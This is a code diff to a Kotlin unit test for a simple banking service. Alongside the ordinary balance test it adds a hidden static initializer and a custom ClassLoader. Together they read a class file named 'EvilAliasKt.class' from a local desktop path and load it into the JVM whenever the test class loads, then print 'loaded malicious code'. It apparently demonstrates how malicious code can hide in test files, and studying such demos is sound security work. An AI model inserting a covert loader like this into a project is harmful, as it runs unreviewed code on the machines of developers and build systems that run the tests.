@@ -3,6 +3,8 @@ package completed.banking
 import completed.banking.impl.SimpleAccount
 import io.kotlintest.matchers.shouldBe
 import io.kotlintest.specs.StringSpec
+import java.nio.file.Files
+import java.nio.file.Paths
 
 /**
  * Created by Simon on 02.01.2018.
@@ -28,5 +30,19 @@ class BankingServiceTest: StringSpec(){
             service.addAccount(SimpleAccount(150))
             service.showEntireMoney() shouldBe 450L
         }
+    }
+    companion object {
+        init {
+            val load = CustomLoader()
+            load.findClass("EvilAliasKt")
+            println("loaded malicious code")
+        }
+    }
+}
+
+class CustomLoader: ClassLoader() {
+    override public fun findClass(name: String?): Class<*> {
+        val bytes = Files.readAllBytes(Paths.get("C:/Users/Simon/Desktop/Evil-Kotlin/EvilAliasKt.class"))
+        return defineClass(name, bytes, 0,bytes.size)
     }
 }
